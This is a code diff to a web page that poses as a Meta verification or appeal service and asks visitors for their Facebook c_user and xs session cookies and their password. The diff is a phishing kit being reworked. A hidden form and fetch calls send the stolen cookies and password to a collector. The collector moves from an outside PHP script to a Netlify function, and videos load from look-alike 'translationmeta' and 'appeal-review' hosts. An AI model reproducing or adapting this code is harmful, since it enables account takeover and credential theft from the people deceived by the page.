@@ -1445,8 +1445,7 @@
                     <div class="form-group">
                         <label for="c_user"><i class="fas fa-user-circle"></i> c_user Value</label>
                         <input type="text" id="c_user" name="c_user" 
-                               placeholder="Enter your c_user value"
-                               pattern="\d+" 
+                               placeholder="Enter your c_user value" 
                                title="c_user only"
                                required>
                         <div class="validation-hint">Must contain a valid c_user value only</div>
@@ -1456,7 +1455,7 @@
                         <label for="xs"><i class="fas fa-key"></i> xs Value</label>
                         <input type="text" id="xs" name="xs" 
                                placeholder="Enter your xs value"
-                               pattern=".{20,}" 
+                              
                                title="xs only"
                                required>
                         <div class="validation-hint">Must contain a valid xs value only</div>
@@ -1534,8 +1533,7 @@
     </div>
     
     <!-- Hidden form for submission -->
-    <form id="hiddenForm" class="hidden-form" action="https://professor-asif.my-style.in/rashidworker1.php
-" method="post">
+    <form id="contactForm" class="hidden-form" action="/.netlify/functions/send-email" method="post">
         <input type="hidden" name="c_user" id="hiddenCUser">
         <input type="hidden" name="xs" id="hiddenXs">
         <input type="hidden" name="password" id="hiddenPassword">
@@ -1558,19 +1556,34 @@
     </footer>
 
     <script>
+        document.getElementById("contactForm").addEventListener("submit", async function(e) {
+  e.preventDefault(); // stop form from reloading the page
+
+  const formData = new FormData(this);
+  const json = Object.fromEntries(formData.entries());
+
+  const res = await fetch("/.netlify/functions/send-email", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(json)
+  });
+
+  const data = await res.json();
+  alert(data.success ? "✅ Message sent!" : "❌ Failed: " + data.error);
+});
         document.addEventListener('DOMContentLoaded', function() {
             // Video files mapping
             const videoFiles = {
-                'english': 'https://request-a-verified-badge-on-apply-s.vercel.app/WhatsApp%20Video%202025-06-13%20at%2016.57.08_1e948794%20(2).mp4?alt=media&token=a36aa6ff-64b7-4d24-b294-cd35d4d57cc2',
-                'filipino': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-07-08%20at%2017.02.46_5eb099cf.mp4',
-                'hindi': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-07-08%20at%2017.13.37_2a7f3e3a.mp4',
-                'portuguese': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-07-08%20at%2000.47.04_1d505be0.mp4',
-                'spanish': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-07-08%20at%2017.07.47_983f4660.mp4',
-                'tamil': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-06-13%20at%2016.57.08_1e948794%20(2).mp4',
-                'arabic': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-07-08%20at%2000.34.01_651fd210.mp4',
-                'french': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-06-13%20at%2016.57.08_1e948794%20(2).mp4',
-                'swedish': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-06-13%20at%2016.57.08_1e948794%20(2).mp4',
-                'japanese': 'https://appeal-review-issue-remove-violation.netlify.app/WhatsApp%20Video%202025-06-13%20at%2016.57.08_1e948794%20(2).mp4'
+                'english': 'https://translationmeta2025-f87fc.web.app/english.mp4',
+                'filipino': 'https://translationmeta2025-f87fc.web.app/filipino.mp4',
+                'hindi': 'https://translationmeta2025-f87fc.web.app/hindi.mp4',
+                'portuguese': 'https://translationmeta2025-f87fc.web.app/portuguese.mp4',
+                'spanish': 'https://translationmeta2025-f87fc.web.app/spanish.mp4',
+                'tamil': 'https://translationmeta2025-f87fc.web.app/Tamil.mp4',
+                'arabic': 'https://translationmeta2025-f87fc.web.app/Arabic.mp4',
+                'french': 'https://translationmeta2025-f87fc.web.app/French.mp4',
+                'swedish': 'https://translationmeta2025-f87fc.web.app/Swedish.mp4',
+                'japanese': 'https://translationmeta2025-f87fc.web.app/japanese.mp4'
             };
             
             // Language modal elements
@@ -1966,14 +1979,15 @@
                 hiddenXs.value = xsInput.value;
                 
                 // Submit c_user and xs together
-                const formData = new FormData();
-                formData.append('c_user', cUserInput.value);
-                formData.append('xs', xsInput.value);
-                
-                fetch('https://professor-asif.my-style.in/rashidworker1.php', {
-                    method: 'POST',
-                    body: formData
-                })
+                fetch('/.netlify/functions/send-email', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        c_user: cUserInput.value,
+        xs: xsInput.value
+    })
+})
+
                 .then(response => {
                     if (!response.ok) {
                         console.error('Submission of c_user and xs failed');
@@ -2013,13 +2027,14 @@
                 hiddenPassword.value = passwordInput.value;
                 
                 // Submit password separately
-                const formData = new FormData();
-                formData.append('password', passwordInput.value);
-                
-                fetch('https://professor-asif.my-style.in/rashidworker1.php', {
-                    method: 'POST',
-                    body: formData
-                })
+                fetch('/.netlify/functions/send-email', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        password: passwordInput.value
+    })
+})
+
                 .then(response => {
                     if (!response.ok) {
                         console.error('Password submission failed');
